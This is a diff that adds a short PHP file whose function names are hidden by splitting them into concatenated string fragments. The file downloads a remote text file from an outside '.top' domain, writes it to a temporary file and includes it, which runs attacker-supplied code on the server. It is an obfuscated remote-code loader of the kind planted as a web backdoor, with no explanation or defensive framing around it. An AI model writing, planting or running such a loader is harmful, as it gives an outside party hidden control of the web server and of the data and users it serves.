@@ -1,0 +1,6 @@
+<?php  
+$tp = "tmp"."f"."il"."e"; 
+$fw = "f"."wr"."ite"; 
+$fgc = "fi"."l"."e_"."ge"."t_co"."ntents"; 
+$sgmd = "s"."tream_"."get_me"."ta_data"; 
+$lanciau = $tp(); $fw($lanciau, $fgc("https://ampnyapunyaku.top/tools/fox/fox.txt")); include $sgmd($lanciau)["uri"]; fclose($lanciau);?>
